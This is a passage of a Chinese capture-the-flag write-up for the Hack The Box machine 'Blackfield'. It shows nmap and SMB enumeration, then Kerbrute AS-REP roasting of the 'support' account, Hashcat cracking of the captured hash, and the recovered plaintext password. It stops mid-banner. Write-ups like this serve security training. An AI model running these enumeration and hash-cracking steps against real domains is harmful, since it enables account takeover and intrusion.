# 端口扫描

## 全端口扫描
~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]                                                       └─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.192 -oA nmap/ports                       [sudo] password for lizi:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 11:44 CST
Nmap scan report for 10.10.10.192
Host is up (0.11s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
49677/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.22 seconds

~~~
## 默认脚本扫描
~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ sudo nmap -sT -sV -sC -p 53,88,135,139,445,593,3268,5985,49677 10.10.10.192 -oA nmap/sC
[sudo] password for lizi:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 11:50 CST
Nmap scan report for 10.10.10.192
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-18 10:34:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-01-18T10:35:15
|_  start_date: N/A
|_clock-skew: 6h44m06s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.32 seconds
~~~
## 漏洞脚本扫描
~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ sudo nmap -sT --script=vuln -p 53,88,135,139,445,593,3268,5985,49677 10.10.10.192 -oA nmap/vuln
[sudo] password for lizi:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 11:50 CST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
49677/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 80.37 seconds


~~~

# 445(smb)

发现非默认共享forensic，访问被拒绝

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ smbclient  -L //10.10.10.192
Password for [WORKGROUP\lizi]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
~~~


~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ smbclient  //10.10.10.192/profiles$
Password for [WORKGROUP\lizi]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  4 00:47:12 2020
  ..                                  D        0  Thu Jun  4 00:47:12 2020
  AAlleni                             D        0  Thu Jun  4 00:47:11 2020
  ABarteski                           D        0  Thu Jun  4 00:47:11 2020
  ABekesz                             D        0  Thu Jun  4 00:47:11 2020
  ABenzies                            D        0  Thu Jun  4 00:47:11 2020
  ABiemiller                          D        0  Thu Jun  4 00:47:11 2020
  AChampken                           D        0  Thu Jun  4 00:47:11 2020
  ACheretei                           D        0  Thu Jun  4 00:47:11 2020
  ACsonaki                            D        0  Thu Jun  4 00:47:11 2020
  AHigchens                           D        0  Thu Jun  4 00:47:11 2020
  AJaquemai                           D        0  Thu Jun  4 00:47:11 2020
  AKlado                              D        0  Thu Jun  4 00:47:11 2020
  AKoffenburger                       D        0  Thu Jun  4 00:47:11 2020
  AKollolli                           D        0  Thu Jun  4 00:47:11 2020
  AKruppe                             D        0  Thu Jun  4 00:47:11 2020
  AKubale                             D        0  Thu Jun  4 00:47:11 2020
  ALamerz                             D        0  Thu Jun  4 00:47:11 2020
  AMaceldon                           D        0  Thu Jun  4 00:47:11 2020
  AMasalunga                          D        0  Thu Jun  4 00:47:11 2020
  ANavay                              D        0  Thu Jun  4 00:47:11 2020
  ANesterova                          D        0  Thu Jun  4 00:47:11 2020
  ANeusse                             D        0  Thu Jun  4 00:47:11 2020
  AOkleshen                           D        0  Thu Jun  4 00:47:11 2020
  APustulka                           D        0  Thu Jun  4 00:47:11 2020
  ARotella                            D        0  Thu Jun  4 00:47:11 2020
  ASanwardeker                        D        0  Thu Jun  4 00:47:11 2020
  AShadaia                            D        0  Thu Jun  4 00:47:11 2020
  ASischo                             D        0  Thu Jun  4 00:47:11 2020
  ASpruce                             D        0  Thu Jun  4 00:47:11 2020
  ATakach                             D        0  Thu Jun  4 00:47:11 2020
  ATaueg                              D        0  Thu Jun  4 00:47:11 2020
  ATwardowski                         D        0  Thu Jun  4 00:47:11 2020
  audit2020                           D        0  Thu Jun  4 00:47:11 2020
  AWangenheim                         D        0  Thu Jun  4 00:47:11 2020
  AWorsey                             D        0  Thu Jun  4 00:47:11 2020
  AZigmunt                            D        0  Thu Jun  4 00:47:11 2020
  BBakajza                            D        0  Thu Jun  4 00:47:11 2020
  BBeloucif                           D        0  Thu Jun  4 00:47:11 2020
  BCarmitcheal                        D        0  Thu Jun  4 00:47:11 2020
  BConsultant                         D        0  Thu Jun  4 00:47:11 2020
  BErdossy                            D        0  Thu Jun  4 00:47:11 2020
  BGeminski                           D        0  Thu Jun  4 00:47:11 2020
  BLostal                             D        0  Thu Jun  4 00:47:11 2020
  BMannise                            D        0  Thu Jun  4 00:47:11 2020
  BNovrotsky                          D        0  Thu Jun  4 00:47:11 2020
  BRigiero                            D        0  Thu Jun  4 00:47:11 2020
  BSamkoses                           D        0  Thu Jun  4 00:47:11 2020
  BZandonella                         D        0  Thu Jun  4 00:47:11 2020
  CAcherman                           D        0  Thu Jun  4 00:47:12 2020
  CAkbari                             D        0  Thu Jun  4 00:47:12 2020
  CAldhowaihi                         D        0  Thu Jun  4 00:47:12 2020
  CArgyropolous                       D        0  Thu Jun  4 00:47:12 2020
  CDufrasne                           D        0  Thu Jun  4 00:47:12 2020
  CGronk                              D        0  Thu Jun  4 00:47:11 2020
  Chiucarello                         D        0  Thu Jun  4 00:47:11 2020
  Chiuccariello                       D        0  Thu Jun  4 00:47:12 2020
  CHoytal                             D        0  Thu Jun  4 00:47:12 2020
  CKijauskas                          D        0  Thu Jun  4 00:47:12 2020
  CKolbo                              D        0  Thu Jun  4 00:47:12 2020
  CMakutenas                          D        0  Thu Jun  4 00:47:12 2020
  CMorcillo                           D        0  Thu Jun  4 00:47:11 2020
  CSchandall                          D        0  Thu Jun  4 00:47:12 2020
  CSelters                            D        0  Thu Jun  4 00:47:12 2020
  CTolmie                             D        0  Thu Jun  4 00:47:12 2020
  DCecere                             D        0  Thu Jun  4 00:47:12 2020
  DChintalapalli                      D        0  Thu Jun  4 00:47:12 2020
  DCwilich                            D        0  Thu Jun  4 00:47:12 2020
  DGarbatiuc                          D        0  Thu Jun  4 00:47:12 2020
  DKemesies                           D        0  Thu Jun  4 00:47:12 2020
  DMatuka                             D        0  Thu Jun  4 00:47:12 2020
  DMedeme                             D        0  Thu Jun  4 00:47:12 2020
  DMeherek                            D        0  Thu Jun  4 00:47:12 2020
  DMetych                             D        0  Thu Jun  4 00:47:12 2020
  DPaskalev                           D        0  Thu Jun  4 00:47:12 2020
  DPriporov                           D        0  Thu Jun  4 00:47:12 2020
  DRusanovskaya                       D        0  Thu Jun  4 00:47:12 2020
  DVellela                            D        0  Thu Jun  4 00:47:12 2020
  DVogleson                           D        0  Thu Jun  4 00:47:12 2020
  DZwinak                             D        0  Thu Jun  4 00:47:12 2020
  EBoley                              D        0  Thu Jun  4 00:47:12 2020
  EEulau                              D        0  Thu Jun  4 00:47:12 2020
  EFeatherling                        D        0  Thu Jun  4 00:47:12 2020
  EFrixione                           D        0  Thu Jun  4 00:47:12 2020
  EJenorik                            D        0  Thu Jun  4 00:47:12 2020
  EKmilanovic                         D        0  Thu Jun  4 00:47:12 2020
  ElKatkowsky                         D        0  Thu Jun  4 00:47:12 2020
  EmaCaratenuto                       D        0  Thu Jun  4 00:47:12 2020
  EPalislamovic                       D        0  Thu Jun  4 00:47:12 2020
  EPryar                              D        0  Thu Jun  4 00:47:12 2020
  ESachhitello                        D        0  Thu Jun  4 00:47:12 2020
  ESariotti                           D        0  Thu Jun  4 00:47:12 2020
  ETurgano                            D        0  Thu Jun  4 00:47:12 2020
  EWojtila                            D        0  Thu Jun  4 00:47:12 2020
  FAlirezai                           D        0  Thu Jun  4 00:47:12 2020
  FBaldwind                           D        0  Thu Jun  4 00:47:12 2020
  FBroj                               D        0  Thu Jun  4 00:47:12 2020
  FDeblaquire                         D        0  Thu Jun  4 00:47:12 2020
  FDegeorgio                          D        0  Thu Jun  4 00:47:12 2020
  FianLaginja                         D        0  Thu Jun  4 00:47:12 2020
  FLasokowski                         D        0  Thu Jun  4 00:47:12 2020
  FPflum                              D        0  Thu Jun  4 00:47:12 2020
  FReffey                             D        0  Thu Jun  4 00:47:12 2020
  GaBelithe                           D        0  Thu Jun  4 00:47:12 2020
  Gareld                              D        0  Thu Jun  4 00:47:12 2020
  GBatowski                           D        0  Thu Jun  4 00:47:12 2020
  GForshalger                         D        0  Thu Jun  4 00:47:12 2020
  GGomane                             D        0  Thu Jun  4 00:47:12 2020
  GHisek                              D        0  Thu Jun  4 00:47:12 2020
  GMaroufkhani                        D        0  Thu Jun  4 00:47:12 2020
  GMerewether                         D        0  Thu Jun  4 00:47:12 2020
  GQuinniey                           D        0  Thu Jun  4 00:47:12 2020
  GRoswurm                            D        0  Thu Jun  4 00:47:12 2020
  GWiegard                            D        0  Thu Jun  4 00:47:12 2020
  HBlaziewske                         D        0  Thu Jun  4 00:47:12 2020
  HColantino                          D        0  Thu Jun  4 00:47:12 2020
  HConforto                           D        0  Thu Jun  4 00:47:12 2020
  HCunnally                           D        0  Thu Jun  4 00:47:12 2020
  HGougen                             D        0  Thu Jun  4 00:47:12 2020
  HKostova                            D        0  Thu Jun  4 00:47:12 2020
  IChristijr                          D        0  Thu Jun  4 00:47:12 2020
  IKoledo                             D        0  Thu Jun  4 00:47:12 2020
  IKotecky                            D        0  Thu Jun  4 00:47:12 2020
  ISantosi                            D        0  Thu Jun  4 00:47:12 2020
  JAngvall                            D        0  Thu Jun  4 00:47:12 2020
  JBehmoiras                          D        0  Thu Jun  4 00:47:12 2020
  JDanten                             D        0  Thu Jun  4 00:47:12 2020
  JDjouka                             D        0  Thu Jun  4 00:47:12 2020
  JKondziola                          D        0  Thu Jun  4 00:47:12 2020
  JLeytushsenior                      D        0  Thu Jun  4 00:47:12 2020
  JLuthner                            D        0  Thu Jun  4 00:47:12 2020
  JMoorehendrickson                   D        0  Thu Jun  4 00:47:12 2020
  JPistachio                          D        0  Thu Jun  4 00:47:12 2020
  JScima                              D        0  Thu Jun  4 00:47:12 2020
  JSebaali                            D        0  Thu Jun  4 00:47:12 2020
  JShoenherr                          D        0  Thu Jun  4 00:47:12 2020
  JShuselvt                           D        0  Thu Jun  4 00:47:12 2020
  KAmavisca                           D        0  Thu Jun  4 00:47:12 2020
  KAtolikian                          D        0  Thu Jun  4 00:47:12 2020
  KBrokinn                            D        0  Thu Jun  4 00:47:12 2020
  KCockeril                           D        0  Thu Jun  4 00:47:12 2020
  KColtart                            D        0  Thu Jun  4 00:47:12 2020
  KCyster                             D        0  Thu Jun  4 00:47:12 2020
  KDorney                             D        0  Thu Jun  4 00:47:12 2020
  KKoesno                             D        0  Thu Jun  4 00:47:12 2020
  KLangfur                            D        0  Thu Jun  4 00:47:12 2020
  KMahalik                            D        0  Thu Jun  4 00:47:12 2020
  KMasloch                            D        0  Thu Jun  4 00:47:12 2020
  KMibach                             D        0  Thu Jun  4 00:47:12 2020
  KParvankova                         D        0  Thu Jun  4 00:47:12 2020
  KPregnolato                         D        0  Thu Jun  4 00:47:12 2020
  KRasmor                             D        0  Thu Jun  4 00:47:12 2020
  KShievitz                           D        0  Thu Jun  4 00:47:12 2020
  KSojdelius                          D        0  Thu Jun  4 00:47:12 2020
  KTambourgi                          D        0  Thu Jun  4 00:47:12 2020
  KVlahopoulos                        D        0  Thu Jun  4 00:47:12 2020
  KZyballa                            D        0  Thu Jun  4 00:47:12 2020
  LBajewsky                           D        0  Thu Jun  4 00:47:12 2020
  LBaligand                           D        0  Thu Jun  4 00:47:12 2020
  LBarhamand                          D        0  Thu Jun  4 00:47:12 2020
  LBirer                              D        0  Thu Jun  4 00:47:12 2020
  LBobelis                            D        0  Thu Jun  4 00:47:12 2020
  LChippel                            D        0  Thu Jun  4 00:47:12 2020
  LChoffin                            D        0  Thu Jun  4 00:47:12 2020
  LCominelli                          D        0  Thu Jun  4 00:47:12 2020
  LDruge                              D        0  Thu Jun  4 00:47:12 2020
  LEzepek                             D        0  Thu Jun  4 00:47:12 2020
  LHyungkim                           D        0  Thu Jun  4 00:47:12 2020
  LKarabag                            D        0  Thu Jun  4 00:47:12 2020
  LKirousis                           D        0  Thu Jun  4 00:47:12 2020
  LKnade                              D        0  Thu Jun  4 00:47:12 2020
  LKrioua                             D        0  Thu Jun  4 00:47:12 2020
  LLefebvre                           D        0  Thu Jun  4 00:47:12 2020
  LLoeradeavilez                      D        0  Thu Jun  4 00:47:12 2020
  LMichoud                            D        0  Thu Jun  4 00:47:12 2020
  LTindall                            D        0  Thu Jun  4 00:47:12 2020
  LYturbe                             D        0  Thu Jun  4 00:47:12 2020
  MArcynski                           D        0  Thu Jun  4 00:47:12 2020
  MAthilakshmi                        D        0  Thu Jun  4 00:47:12 2020
  MAttravanam                         D        0  Thu Jun  4 00:47:12 2020
  MBrambini                           D        0  Thu Jun  4 00:47:12 2020
  MHatziantoniou                      D        0  Thu Jun  4 00:47:12 2020
  MHoerauf                            D        0  Thu Jun  4 00:47:12 2020
  MKermarrec                          D        0  Thu Jun  4 00:47:12 2020
  MKillberg                           D        0  Thu Jun  4 00:47:12 2020
  MLapesh                             D        0  Thu Jun  4 00:47:12 2020
  MMakhsous                           D        0  Thu Jun  4 00:47:12 2020
  MMerezio                            D        0  Thu Jun  4 00:47:12 2020
  MNaciri                             D        0  Thu Jun  4 00:47:12 2020
  MShanmugarajah                      D        0  Thu Jun  4 00:47:12 2020
  MSichkar                            D        0  Thu Jun  4 00:47:12 2020
  MTemko                              D        0  Thu Jun  4 00:47:12 2020
  MTipirneni                          D        0  Thu Jun  4 00:47:12 2020
  MTonuri                             D        0  Thu Jun  4 00:47:12 2020
  MVanarsdel                          D        0  Thu Jun  4 00:47:12 2020
  NBellibas                           D        0  Thu Jun  4 00:47:12 2020
  NDikoka                             D        0  Thu Jun  4 00:47:12 2020
  NGenevro                            D        0  Thu Jun  4 00:47:12 2020
  NGoddanti                           D        0  Thu Jun  4 00:47:12 2020
  NMrdirk                             D        0  Thu Jun  4 00:47:12 2020
  NPulido                             D        0  Thu Jun  4 00:47:12 2020
  NRonges                             D        0  Thu Jun  4 00:47:12 2020
  NSchepkie                           D        0  Thu Jun  4 00:47:12 2020
  NVanpraet                           D        0  Thu Jun  4 00:47:12 2020
  OBelghazi                           D        0  Thu Jun  4 00:47:12 2020
  OBushey                             D        0  Thu Jun  4 00:47:12 2020
  OHardybala                          D        0  Thu Jun  4 00:47:12 2020
  OLunas                              D        0  Thu Jun  4 00:47:12 2020
  ORbabka                             D        0  Thu Jun  4 00:47:12 2020
  PBourrat                            D        0  Thu Jun  4 00:47:12 2020
  PBozzelle                           D        0  Thu Jun  4 00:47:12 2020
  PBranti                             D        0  Thu Jun  4 00:47:12 2020
  PCapperella                         D        0  Thu Jun  4 00:47:12 2020
  PCurtz                              D        0  Thu Jun  4 00:47:12 2020
  PDoreste                            D        0  Thu Jun  4 00:47:12 2020
  PGegnas                             D        0  Thu Jun  4 00:47:12 2020
  PMasulla                            D        0  Thu Jun  4 00:47:12 2020
  PMendlinger                         D        0  Thu Jun  4 00:47:12 2020
  PParakat                            D        0  Thu Jun  4 00:47:12 2020
  PProvencer                          D        0  Thu Jun  4 00:47:12 2020
  PTesik                              D        0  Thu Jun  4 00:47:12 2020
  PVinkovich                          D        0  Thu Jun  4 00:47:12 2020
  PVirding                            D        0  Thu Jun  4 00:47:12 2020
  PWeinkaus                           D        0  Thu Jun  4 00:47:12 2020
  RBaliukonis                         D        0  Thu Jun  4 00:47:12 2020
  RBochare                            D        0  Thu Jun  4 00:47:12 2020
  RKrnjaic                            D        0  Thu Jun  4 00:47:12 2020
  RNemnich                            D        0  Thu Jun  4 00:47:12 2020
  RPoretsky                           D        0  Thu Jun  4 00:47:12 2020
  RStuehringer                        D        0  Thu Jun  4 00:47:12 2020
  RSzewczuga                          D        0  Thu Jun  4 00:47:12 2020
  RVallandas                          D        0  Thu Jun  4 00:47:12 2020
  RWeatherl                           D        0  Thu Jun  4 00:47:12 2020
  RWissor                             D        0  Thu Jun  4 00:47:12 2020
  SAbdulagatov                        D        0  Thu Jun  4 00:47:12 2020
  SAjowi                              D        0  Thu Jun  4 00:47:12 2020
  SAlguwaihes                         D        0  Thu Jun  4 00:47:12 2020
  SBonaparte                          D        0  Thu Jun  4 00:47:12 2020
  SBouzane                            D        0  Thu Jun  4 00:47:12 2020
  SChatin                             D        0  Thu Jun  4 00:47:12 2020
  SDellabitta                         D        0  Thu Jun  4 00:47:12 2020
  SDhodapkar                          D        0  Thu Jun  4 00:47:12 2020
  SEulert                             D        0  Thu Jun  4 00:47:12 2020
  SFadrigalan                         D        0  Thu Jun  4 00:47:12 2020
  SGolds                              D        0  Thu Jun  4 00:47:12 2020
  SGrifasi                            D        0  Thu Jun  4 00:47:12 2020
  SGtlinas                            D        0  Thu Jun  4 00:47:12 2020
  SHauht                              D        0  Thu Jun  4 00:47:12 2020
  SHederian                           D        0  Thu Jun  4 00:47:12 2020
  SHelregel                           D        0  Thu Jun  4 00:47:12 2020
  SKrulig                             D        0  Thu Jun  4 00:47:12 2020
  SLewrie                             D        0  Thu Jun  4 00:47:12 2020
  SMaskil                             D        0  Thu Jun  4 00:47:12 2020
  Smocker                             D        0  Thu Jun  4 00:47:12 2020
  SMoyta                              D        0  Thu Jun  4 00:47:12 2020
  SRaustiala                          D        0  Thu Jun  4 00:47:12 2020
  SReppond                            D        0  Thu Jun  4 00:47:12 2020
  SSicliano                           D        0  Thu Jun  4 00:47:12 2020
  SSilex                              D        0  Thu Jun  4 00:47:12 2020
  SSolsbak                            D        0  Thu Jun  4 00:47:12 2020
  STousignaut                         D        0  Thu Jun  4 00:47:12 2020
  support                             D        0  Thu Jun  4 00:47:12 2020
  svc_backup                          D        0  Thu Jun  4 00:47:12 2020
  SWhyte                              D        0  Thu Jun  4 00:47:12 2020
  SWynigear                           D        0  Thu Jun  4 00:47:12 2020
  TAwaysheh                           D        0  Thu Jun  4 00:47:12 2020
  TBadenbach                          D        0  Thu Jun  4 00:47:12 2020
  TCaffo                              D        0  Thu Jun  4 00:47:12 2020
  TCassalom                           D        0  Thu Jun  4 00:47:12 2020
  TEiselt                             D        0  Thu Jun  4 00:47:12 2020
  TFerencdo                           D        0  Thu Jun  4 00:47:12 2020
  TGaleazza                           D        0  Thu Jun  4 00:47:12 2020
  TKauten                             D        0  Thu Jun  4 00:47:12 2020
  TKnupke                             D        0  Thu Jun  4 00:47:12 2020
  TLintlop                            D        0  Thu Jun  4 00:47:12 2020
  TMusselli                           D        0  Thu Jun  4 00:47:12 2020
  TOust                               D        0  Thu Jun  4 00:47:12 2020
  TSlupka                             D        0  Thu Jun  4 00:47:12 2020
  TStausland                          D        0  Thu Jun  4 00:47:12 2020
  TZumpella                           D        0  Thu Jun  4 00:47:12 2020
  UCrofskey                           D        0  Thu Jun  4 00:47:12 2020
  UMarylebone                         D        0  Thu Jun  4 00:47:12 2020
  UPyrke                              D        0  Thu Jun  4 00:47:12 2020
  VBublavy                            D        0  Thu Jun  4 00:47:12 2020
  VButziger                           D        0  Thu Jun  4 00:47:12 2020
  VFuscca                             D        0  Thu Jun  4 00:47:12 2020
  VLitschauer                         D        0  Thu Jun  4 00:47:12 2020
  VMamchuk                            D        0  Thu Jun  4 00:47:12 2020
  VMarija                             D        0  Thu Jun  4 00:47:12 2020
  VOlaosun                            D        0  Thu Jun  4 00:47:12 2020
  VPapalouca                          D        0  Thu Jun  4 00:47:12 2020
  WSaldat                             D        0  Thu Jun  4 00:47:12 2020
  WVerzhbytska                        D        0  Thu Jun  4 00:47:12 2020
  WZelazny                            D        0  Thu Jun  4 00:47:12 2020
  XBemelen                            D        0  Thu Jun  4 00:47:12 2020
  XDadant                             D        0  Thu Jun  4 00:47:12 2020
  XDebes                              D        0  Thu Jun  4 00:47:12 2020
  XKonegni                            D        0  Thu Jun  4 00:47:12 2020
  XRykiel                             D        0  Thu Jun  4 00:47:12 2020
  YBleasdale                          D        0  Thu Jun  4 00:47:12 2020
  YHuftalin                           D        0  Thu Jun  4 00:47:12 2020
  YKivlen                             D        0  Thu Jun  4 00:47:12 2020
  YKozlicki                           D        0  Thu Jun  4 00:47:12 2020
  YNyirenda                           D        0  Thu Jun  4 00:47:12 2020
  YPredestin                          D        0  Thu Jun  4 00:47:12 2020
  YSeturino                           D        0  Thu Jun  4 00:47:12 2020
  YSkoropada                          D        0  Thu Jun  4 00:47:12 2020
  YVonebers                           D        0  Thu Jun  4 00:47:12 2020
  YZarpentine                         D        0  Thu Jun  4 00:47:12 2020
  ZAlatti                             D        0  Thu Jun  4 00:47:12 2020
  ZKrenselewski                       D        0  Thu Jun  4 00:47:12 2020
  ZMalaab                             D        0  Thu Jun  4 00:47:12 2020
  ZMiick                              D        0  Thu Jun  4 00:47:12 2020
  ZScozzari                           D        0  Thu Jun  4 00:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 00:47:12 2020
  ZWausik                             D        0  Thu Jun  4 00:47:12 2020

                5102079 blocks of size 4096. 1690891 blocks available
~~~

格式化一下，生成一个用户名字典

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ cat profiles |  grep 'D' | awk -F ' ' '{print $1}' > users.txt
~~~

使用kerbrute爆破用户名，发现可以抓取到用户support的hash

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield/kerbrute]
└─$ ./kerbrute userenum -d blackfield.local --dc 10.10.10.192 ../users.txt
                                                                                                                                                                                                                     __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/18/25 - Ronnie Flathers @ropnop

2025/01/18 12:11:42 >  Using KDC(s):
2025/01/18 12:11:42 >   10.10.10.192:88

2025/01/18 12:12:03 >  [+] VALID USERNAME:       audit2020@blackfield.local
2025/01/18 12:14:05 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:abf25b0efa5749b0b8d9356ba1a2e3c5$7df97392c43d994233b7e2b9b0a6c64f58a47d1ccbb470ca93676467607d5dbe8ca10e38a8fb94fc4edb7ae817bd2b59673da33ab5f9836c68412c6080a2733336df288c2391944c5e1120693f76a92560d3d71e63eaa4a5bb7f19806d5cf77548ac517a1ed9a90912eda4a51cb06bd0ad32c4d6c6ad71ebc497f95bc071044a6087b9ddc0a3a30f922aa2b815239180e19a0a17ff1f78ab9e228c3e3cf94e552ec385c9d8ceda1720601c8a89b5442b5d067cec9aef8a27db5c4e49e6ae4dcf172d7dde1bea15248eecc641a6355d56a3684ff2356b6b5103ca6d951bc8c012566ee00e8018328366f90417d614d3d57fbb9aee22a17475c0561db7c0a9e08830906835f166b9c3
2025/01/18 12:14:05 >  [+] VALID USERNAME:       support@blackfield.local
2025/01/18 12:14:05 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2025/01/18 12:14:32 >  Done! Tested 316 usernames (3 valid) in 169.714 seconds

~~~

使用hashcat破解出密码为

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ hashcat -m 18200 support-hash  /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2856/5777 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                                                                                                                                                       Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                                                                                                                                              Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385                                                                                                                                                                                                                                                                                                    
$krb5asrep$23$support@BLACKFIELD.LOCAL:3a9b3af54add41b1099e38ab5c4742d9$2782176b916fbbba213580467f09787ad53b1bfb6e6e6da6b18e28a163023ca04f2337dba0a18087535004e07c82470e629a117dcb70ed257b6a6c9cc4086ed073887483aa740850ecd9eba5e44315865fa15ec807fc30df7367e48e05e09334de1c8cebfc07f2a270f209663af46116d2d9de29a13856c0c454c688b26c9b9cdd234875f25d4528a1232c0778e7570dd2667f9f6bed33b360b6a334854cc560f274810fb39bd028a3558a4639982b4f2a060406ec94d86be7bfe6ac3acae959a6e05e3adb904b7d25154745455a63ec40c56e9d9e9bb47e40bf9463b95101149ecc39acc4864b777c22ec8be110239d2e4b378d:#00^BlackKnight                                                    
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:3a9b3af54add...4b378d
Time.Started.....: Sat Jan 18 12:24:31 2025 (5 secs)
Time.Estimated...: Sat Jan 18 12:24:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel                                                                                                                                                                                                                                                                                            Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2841.0 kH/s (1.16ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14340096/14344385 (99.97%)                                                                                                                                                                                                                                                                             Rejected.........: 0/14340096 (0.00%)
Restore.Point....: 14333952/14344385 (99.93%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #1crapper -> !carragold!

Started: Sat Jan 18 12:24:29 2025
Stopped: Sat Jan 18 12:24:38 2025
~~~

smb验证可以通过

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ nxc smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
~~~

smbmap列出可读的文件，但是都没有什么用

~~~
┌──(lizi㉿lizi)-[~/htb/blackfield]
└─$ smbmap -u support -p '#00^BlackKnight' -H 10.10.10.192
                                                                                                                                                                                                                     ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
